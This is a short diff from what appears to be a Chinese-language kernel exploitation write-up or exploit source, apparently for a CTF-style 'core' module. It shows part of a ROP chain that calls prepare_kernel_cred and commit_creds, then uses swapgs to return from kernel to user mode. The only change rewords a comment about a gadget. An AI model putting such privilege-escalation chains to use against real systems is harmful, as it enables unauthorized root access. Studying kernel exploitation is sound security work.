@@ -261,7 +261,7 @@ pwndbg> x /10gx $rbx
     rop[i++] = prepare_kernel_cred_addr;
     rop[i++] = vmlinux_base + 0xa0f49;      //pop_rdx_ret <= ret调用后，栈上的内容作为返回参数弹出（函数不会修改栈上内容），RIP至该地址
     rop[i++] = vmlinux_base + 0x21e53;      //pop_rcx_ret <= cred_addr返回后的RSP
-    rop[i++] = vmlinux_base + 0x1aa6a;      //mov_rdi_rax_call_rdx => 跳转回vmlinux_base + 0x21e53
+    rop[i++] = vmlinux_base + 0x1aa6a;      //mov_rdi_rax_call_rdx => 跳转回vmlinux_base + 0x21e53，压栈RIP的下一条指令vmlinux_base + 0x1aa6f
     rop[i++] = commit_creds_addr;           //  <= 执行pop_rcx_ret时的RSP 
     rop[i++] = core_base + 0xd6;            //swapgs;pop_rbp;ret
     rop[i++] = 0;                           //rbp(junk)
